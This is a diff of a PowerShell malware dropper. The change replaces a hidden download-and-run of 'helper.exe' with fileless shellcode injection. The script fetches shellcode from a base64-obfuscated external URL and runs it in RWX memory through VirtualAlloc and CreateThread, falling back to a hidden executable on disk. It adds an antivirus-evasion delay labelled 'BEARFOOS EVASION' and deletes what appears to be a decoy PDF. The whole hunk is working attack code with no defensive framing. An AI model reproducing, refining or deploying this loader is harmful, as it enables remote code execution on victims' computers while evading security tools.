@@ -75,27 +75,37 @@ if (-not $isFirstRun) {
     Start-Sleep -Seconds $rebootDelay
 }
 
-# === BEARFOOS EVASION: Delay before EXE ===
+# === BEARFOOS EVASION: Delay before payload ===
 Start-Sleep -Seconds (Get-Random -Min 45 -Max 90)
 
-# === DOWNLOAD AND EXECUTE PAYLOAD ===
-$exeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvdXBkYXRl'))
-$exePath = "$cache\helper.exe"
+# === FILELESS SHELLCODE INJECTION ===
+$shellcodeUrl = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cHM6Ly9hZ2VkLW1vdW50YWluLTYxNGIubmF0YWxpYS1rdXNoODIud29ya2Vycy5kZXYvc2hlbGxjb2Rl'))
 
-if (-not (Test-Path $exePath)) {
-    $retryCount = 0; $maxRetries = 3
-    do {
-        try { Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -Headers $headers -UseBasicParsing; break } catch { $retryCount++; Start-Sleep -Seconds 5 }
-    } while ($retryCount -lt $maxRetries)
+try {
+    # Download shellcode to memory
+    $sc = (New-Object Net.WebClient).DownloadData($shellcodeUrl)
+    
+    # P/Invoke for injection
+    $k32 = Add-Type -MemberDefinition @"
+[DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
+[DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr a, uint s, IntPtr f, IntPtr p, uint c, IntPtr i);
+[DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr h, uint m);
+"@ -Name 'K32' -Namespace 'Win32' -PassThru
+    
+    # Allocate RWX memory and copy shellcode
+    $addr = $k32::VirtualAlloc(0, [uint32]$sc.Length, 0x3000, 0x40)
+    [System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $addr, $sc.Length)
+    
+    # Execute in new thread
+    $thread = $k32::CreateThread(0, 0, $addr, 0, 0, 0)
+    $k32::WaitForSingleObject($thread, 0) | Out-Null
+    
+} catch {
+    # Fallback: Write to disk only if injection fails
+    $fallbackPath = "$cache\helper.exe"
+    [System.IO.File]::WriteAllBytes($fallbackPath, $sc)
+    Start-Process $fallbackPath -WindowStyle Hidden
 }
 
-if (Test-Path $exePath) {
-    try {
-        Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "`"$exePath`"" -ErrorAction Stop | Out-Null
-    } catch {
-        try { (New-Object -ComObject WScript.Shell).Run("`"$exePath`"", 0, $false) } catch { Start-Process $exePath -WindowStyle Hidden }
-    }
-}
-
-# === CLEANUP ===
-Start-Job -ScriptBlock { param($exe, $pdf) Start-Sleep -Seconds 300; Remove-Item $exe,$pdf -Force -ErrorAction SilentlyContinue } -ArgumentList $exePath, $pdfPath | Out-Null
+# === CLEANUP (PDF only - no EXE on disk) ===
+Start-Job -ScriptBlock { param($pdf) Start-Sleep -Seconds 300; Remove-Item $pdf -Force -ErrorAction SilentlyContinue } -ArgumentList $pdfPath | Out-Null
